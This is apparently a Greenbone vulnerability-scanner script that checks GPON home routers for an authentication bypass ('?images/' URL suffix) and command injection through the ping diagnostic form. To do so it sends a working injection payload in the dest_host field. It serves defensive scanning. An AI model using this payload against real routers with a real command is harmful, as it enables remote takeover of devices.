if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.113170" );
	script_version( "2021-06-24T11:00:30+0000" );
	script_tag( name: "last_modification", value: "2021-06-24 11:00:30 +0000 (Thu, 24 Jun 2021)" );
	script_tag( name: "creation_date", value: "2018-05-03 16:26:55 +0200 (Thu, 03 May 2018)" );
	script_tag( name: "cvss_base", value: "7.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:P" );
	script_tag( name: "severity_vector", value: "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H" );
	script_tag( name: "severity_origin", value: "NVD" );
	script_tag( name: "severity_date", value: "2019-03-04 18:39:00 +0000 (Mon, 04 Mar 2019)" );
	script_tag( name: "qod_type", value: "exploit" );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_cve_id( "CVE-2018-10561", "CVE-2018-10562" );
	script_name( "GPON Routers Multiple Vulnerabilities" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2018 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "gb_gpon_home_router_detect.sc" );
	script_mandatory_keys( "gpon/home_router/detected" );
	script_tag( name: "summary", value: "GPON Home Routers are prone to multiple vulnerabilities.

  Those vulnerabilities where known to be exploited by the Mettle, Muhstik, Mirai, Hajime, and Satori Botnets in 2018." );
	script_tag( name: "vuldetect", value: "The script tries to exploit both vulnerabilities and execute and 'id' command
  on the target and checks if it was successful." );
	script_tag( name: "insight", value: "There exist two vulnerabilities:

  - Appending '?images/' to the URL when accessing the router's web interface will bypass authentication

  - The 'ping' command of the router allows for code execution." );
	script_tag( name: "impact", value: "Successful exploitation would allow an attacker to gain complete control over
  the target." );
	script_tag( name: "affected", value: "All GPON Home Routers are possibly affected." );
	script_tag( name: "solution", value: "Contact the vendor to obtain a solution." );
	script_xref( name: "URL", value: "https://www.vpnmentor.com/blog/critical-vulnerability-gpon-router/" );
	exit( 0 );
}
CPE = "cpe:/o:gpon:home_router_firmware";
require("host_details.inc.sc");
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("misc_func.inc.sc");
if(!port = get_app_port( cpe: CPE, service: "www" )){
	exit( 0 );
}
if(!get_app_location( cpe: CPE, port: port, nofork: TRUE )){
	exit( 0 );
}
non_command = rand_str( length: 12, charset: "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ" );
exploit_urls = make_list( "/GponForm/diag_Form?images/",
	 "/menu.html?images/" );
exploit_data = "XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=\\`" + non_command + "\\`;" + non_command + "&ipv=0\"";
result_url = "/diag.html?images/";
for url in exploit_urls {
	req = http_post( port: port, item: url, data: exploit_data );
	http_keepalive_send_recv( port: port, data: req );
}
sleep( 5 );
req = http_get( port: port, item: result_url );
res = http_keepalive_send_recv( port: port, data: req );
if(!res || !IsMatchRegexp( res, "^HTTP/1\\.[01] 200" )){
	exit( 99 );
}
if(ContainsString( res, NASLString( "sh: ", non_command, ": not found" ) ) || ContainsString( res, "diag_result = \"BusyBox v" )){
	report = http_report_vuln_url( port: port, url: result_url );
	VULN = TRUE;
}
if(expl = egrep( string: res, pattern: "var diag_host = \"`" )){
	report = http_report_vuln_url( port: port, url: result_url );
	report += "\n\nNOTE: The device has already been exploited by an attacker with the following command: " + expl;
	VULN = TRUE;
}
if(VULN){
	security_message( data: report, port: port );
	exit( 0 );
}
exit( 99 );

